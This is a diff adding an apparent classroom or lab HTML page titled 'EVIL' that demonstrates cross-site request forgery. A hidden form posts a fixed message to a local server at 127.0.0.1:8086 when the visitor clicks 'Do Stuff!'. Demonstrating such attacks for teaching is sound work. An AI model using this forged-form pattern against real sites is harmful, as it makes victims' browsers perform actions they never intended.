@@ -1,0 +1,40 @@
+<!DOCTYPE html>
+<html lang="en">
+    <head>
+        <meta charset="UTF-8">
+        <title>EVIL - Every Villain Is Lemon</title>
+
+        <!-- Vue -->
+        <script src="https://cdn.jsdelivr.net/npm/vue"></script>
+
+        <!-- Bootstrap CSS -->
+        <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/css/bootstrap.min.css"
+              integrity="sha384-Gn5384xqQ1aoWXA+058RXPxPg6fy4IWvTNh0E263XmFcJlSAwiGgFAW/dAiS6JXm"
+              crossorigin="anonymous">
+    </head>
+    <body>       
+        <div class="container" id="vue-users">
+            <h1>What's up dude?</h1>
+
+            <form action="http://127.0.0.1:8086/message/post" method="post" target="my_iframe">
+                <input type="hidden" name="text" value="I'm dumb and didn't protect my website">
+                <input type="submit" value="Do Stuff!" />
+            </form>
+
+            <!-- when the form is submitted, the server response will appear in this iframe -->
+            <iframe name="my_iframe" src=""></iframe>
+        </div>
+    </body>
+    
+    <script>        
+        var app = new Vue({
+            el: '#vue-users',
+            data: {
+            },
+            methods: {
+            },
+            mounted: async function() {
+            }
+        })
+    </script>
+</html>
